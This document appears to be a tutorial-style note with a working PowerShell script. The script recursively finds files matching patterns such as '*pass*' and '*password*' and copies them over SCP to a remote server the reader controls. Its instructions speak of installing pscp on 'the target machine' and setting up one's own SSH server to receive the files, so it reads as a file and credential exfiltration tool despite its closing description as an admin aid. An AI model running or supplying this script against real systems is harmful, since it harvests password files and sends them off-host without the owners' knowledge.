#### Purpose:
This PowerShell script searches for files within a specified directory that match given patterns (e.g., files with `.md` extension or containing `*pass*` in their names) and transfers them to a remote server using SCP (Secure Copy Protocol).
#### Requirements:
1. **PowerShell**: Ensure you have PowerShell installed on your machine.
2. **SCP Client**: `pscp.exe` should be installed on the target machine
3. **Network Configuration**: Ensure your machine can communicate with the remote server over SSH. (firewalls may block SSH)
>[!info] You also need to set up your own ssh server to receive the files
#### Script
```powershell
# Define the directory to search
$searchDirectory = "C:\Path\To\Search"

# Define the patterns to search for
$patterns = @("*.md", "*pass*")

# Define the remote server details
$remoteServer = "username@remote.server.com"
$remotePath = "/path/on/server/"
$scpPath = "C:\Path\To\pscp.exe" # Path to pscp.exe

# Function to send file using SCP
function Send-File {
    param (
        [string]$filePath
    )
    & $scpPath $filePath "${remoteServer}:${remotePath}"
}

# Search and send files
foreach ($pattern in $patterns) {
    $files = Get-ChildItem -Path $searchDirectory -Filter $pattern -Recurse -File
    foreach ($file in $files) {
        Write-Host "Sending $($file.FullName) to $remoteServer"
        Send-File -filePath $file.FullName
    }
}
```

#### Instructions
1. **Update Script Variables**:
   - Open the script in a text editor.
   - Set the `$searchDirectory` variable to the directory you want to search.
   - Adjust the `$patterns` array to include the file patterns you want to search for.
   - Update `$remoteServer` with your remote server's username and address.
   - Set `$remotePath` to the path on the remote server where the files should be transferred.
   - Update `$scpPath` with the path to the `pscp.exe` executable.

2. **Script Execution**:
   - The script will search for files matching the specified patterns in the given directory.
   - Each matched file will be transferred to the specified remote server using SCP.
   - The console will output the status of each file being sent.

#### Example Usage
If you want to search for Markdown files (`*.md`) and files containing `password` in their names within `C:\Documents`, and send them to the remote server `example.com` in the directory `/uploads`, here is how you can set it up:

**Script Configuration**:
   ```powershell
   $searchDirectory = "C:\Documents"
   $patterns = @("*.md", "*password*")
   $remoteServer = "username@example.com"
   $remotePath = "/uploads/"
   $scpPath = "C:\Path\To\pscp.exe"
   ```

This script automates the process of searching for specific files and transferring them to a remote server, making it useful for various administrative and security tasks.